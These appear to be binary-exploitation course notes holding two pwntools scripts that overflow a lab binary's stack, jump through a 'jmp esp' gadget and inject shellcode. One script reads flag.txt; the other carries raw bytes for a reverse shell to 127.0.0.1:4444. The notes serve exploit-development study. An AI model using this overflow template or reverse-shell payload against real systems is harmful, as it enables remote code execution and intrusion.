#shellcraft   ^8c5004

```python
from pwn import *

  
  

# Allows you to switch between local/GDB/remote from terminal

def start(argv=[], *a, **kw):

if args.GDB: # Set GDBscript below

return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)

elif args.REMOTE: # ('server', 'port')

return remote(sys.argv[1], sys.argv[2], *a, **kw)

else: # Run locally

return process([exe] + argv, *a, **kw)

  
  

# Find offset to EIP/RIP for buffer overflows

def find_ip(payload):

# Launch process and send payload

p = process(exe, level='warn')

p.sendlineafter(b':', payload)

# Wait for the process to crash

p.wait()

# Print out the address of EIP/RIP at the time of crashing

ip_offset = cyclic_find(p.corefile.pc) # x86

# ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4)) # x64

warn('located EIP/RIP offset at {a}'.format(a=ip_offset))

return ip_offset

  
  

# Specify GDB script here (breakpoints etc)

gdbscript = '''

init-pwndbg

continue

'''.format(**locals())

  

# Binary filename

exe = './server'

# This will automatically get context arch, bits, os etc

elf = context.binary = ELF(exe, checksec=False)

# Change logging level to help with debugging (error/warning/info/debug)

context.log_level = 'debug'

  

# ===========================================================

# EXPLOIT GOES HERE

# ===========================================================

  

# Lib-C library, can use pwninit/patchelf to patch binary

# libc = ELF("./libc.so.6")

# ld = ELF("./ld-2.27.so")

  

# Pass in pattern_size, get back EIP/RIP offset

offset = find_ip(cyclic(500))

  

# assemble the byte sequence to find the jmp_esp so we can search for it

jmp_esp = asm('jmp esp')

jmp_esp = next(elf.search(jmp_esp))

  

shellcode = asm(shellcraft.cat('flag.txt'))

shellcode += asm(shellcraft.exit())

  

# Start program

io = start()

  

# Build the payload

payload = flat({

offset: [

jmp_esp,

asm('nop') * 16, # this is for padding just in case we need some padding

shellcode

]

})

  

# Send the payload

io.sendlineafter(b':', payload)

  
  

# Got Shell?

io.interactive()
```

#msfvenom ^1b1fba
[[Binary Exploitation/05 Injecting shellcode/Main|Main]] 

```python
from pwn import *

  
  

# Allows you to switch between local/GDB/remote from terminal

def start(argv=[], *a, **kw):

if args.GDB: # Set GDBscript below

return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)

elif args.REMOTE: # ('server', 'port')

return remote(sys.argv[1], sys.argv[2], *a, **kw)

else: # Run locally

return process([exe] + argv, *a, **kw)

  
  

# Find offset to EIP/RIP for buffer overflows

def find_ip(payload):

# Launch process and send payload

p = process(exe, level='warn')

p.sendlineafter(b':', payload)

# Wait for the process to crash

p.wait()

# Print out the address of EIP/RIP at the time of crashing

ip_offset = cyclic_find(p.corefile.pc) # x86

#ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4)) # x64

warn('located EIP/RIP offset at {a}'.format(a=ip_offset))

return ip_offset

  
  

# Specify GDB script here (breakpoints etc)

gdbscript = '''

init-pwndbg

continue

'''.format(**locals())

  

# Binary filename

exe = './server'

# This will automatically get context arch, bits, os etc

elf = context.binary = ELF(exe, checksec=False)

# Change logging level to help with debugging (error/warning/info/debug)

context.log_level = 'debug'

  

# ===========================================================

# EXPLOIT GOES HERE

# ===========================================================

  

# Lib-C library, can use pwninit/patchelf to patch binary

# libc = ELF("./libc.so.6")

# ld = ELF("./ld-2.27.so")

  

# Pass in pattern_size, get back EIP/RIP offset

offset = find_ip(cyclic(500))

  

jmp_esp = asm('jmp esp')

jmp_esp = next(elf.search(jmp_esp))

  

buf = b""

buf += b"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0"

buf += b"\x66\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9"

buf += b"\x68\x7f\x00\x00\x01\x68\x02\x00\x11\x5c\x89\xe1"

buf += b"\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52"

buf += b"\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3"

buf += b"\x52\x53\x89\xe1\xb0\x0b\xcd\x80"

  
  

# Start program

io = start()

  

# Build the payload

payload = flat({

offset: [

jmp_esp,

asm('nop')*16,

buf

]

})

  

# Send the payload

io.sendlineafter(b':', payload)

  

# Got Shell?

io.interactive()
```